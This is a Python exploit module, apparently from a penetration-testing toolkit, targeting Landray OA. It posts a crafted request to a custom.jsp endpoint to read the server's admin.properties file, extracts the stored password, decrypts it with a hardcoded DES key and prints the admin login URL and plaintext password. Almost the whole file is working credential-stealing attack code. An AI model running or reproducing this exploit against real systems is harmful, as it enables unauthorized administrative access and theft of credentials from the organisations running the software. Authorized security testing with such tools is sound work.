from util.ExpRequest import ExpRequest,Output
from ClassCongregation import des_dec
import util.globalvar as GlobalVar
import prettytable as pt
import re
"""
import util.globalvar as GlobalVar
from ClassCongregation import ysoserial_payload,Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class LandrayOA():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.status = env.get('status')
            
    def cve_custom_filereading(self):
        appName = 'LandrayOA'
        pocname = 'cve_custom_filereading'
        path = '/sys/ui/extend/varkind/custom.jsp'
        method = 'post'
        desc = '[file reading] app="Landray-OA系统"'
        data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"password" in r.text:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                pwd = re.search(r'password = (.*)\\r', result).group(1)
                #默认只取前8位密钥
                pwd = des_dec(pwd, 'kmssAdminKey'[0:8])
                print('[+]登录地址: %s ,登录密码: %s'%(self.url+'/admin.do',pwd))
        except Exception as error:
            return output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row([
    "LandrayOA",
    "cve_custom_filereading",
    "[file reading] app=\"Landray-OA系统\""
])
print(tb)

def check(**kwargs):
    from concurrent.futures import ThreadPoolExecutor,wait,ALL_COMPLETED
    result_list = []
    thread_list = []
    result_list.append('----------------------------')
    #5代表只能开启5个进程, 不加默认使用cpu的进程数
    pool = ThreadPoolExecutor(int(kwargs['pool_num']))
    ExpLandrayOA = LandrayOA(**kwargs)
    if kwargs['pocname'] != 'ALL':
        #返回对象函数属性值，可以直接调用
        func = getattr(ExpLandrayOA, kwargs['pocname'])
        #调用函数
        return func()
    #调用所有函数
    else:
        for func in dir(LandrayOA):
            if not func.startswith("__"):
                thread_list.append(pool.submit(getattr(ExpLandrayOA, func)))
        #保存全局子线程列表
        GlobalVar.set_value('thread_list', thread_list)
        #等待所有多线程任务运行完
        wait(thread_list, return_when=ALL_COMPLETED)
        for task in thread_list:
            #去除取消掉的future任务
            if task.cancelled() == False:
                if task.result() is None:
                    result_list.append('函数没有返回值')
                else:   
                    result_list.append(task.result())
    result_list.append('----------------------------')
    return '\n'.join(result_list)








